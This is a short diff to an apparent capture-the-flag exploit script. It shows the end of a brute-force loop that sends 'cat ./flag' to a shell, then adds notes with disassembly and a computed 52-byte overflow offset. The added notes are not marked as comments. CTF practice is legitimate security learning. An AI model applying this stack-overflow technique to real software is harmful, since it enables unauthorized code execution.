@@ -15,3 +15,16 @@ for i in range(32,100):
                 p.sendline("cat ./flag")
                 p.interactive()
                 break
+                
+                
+#Below is comment Secion:Right Solution Without Bruteforce                
+                        lea    eax,[ebp-0x2c]
+   0x0000064c <+32>:    mov    DWORD PTR [esp],eax
+   0x0000064f <+35>:    call   0x650 <func+36>
+   0x00000654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe                
+
+
+Buffer Size :44bytes
+Base Pointer:4bytes
+Return Address:4 bytes
+So The Offset is 52 
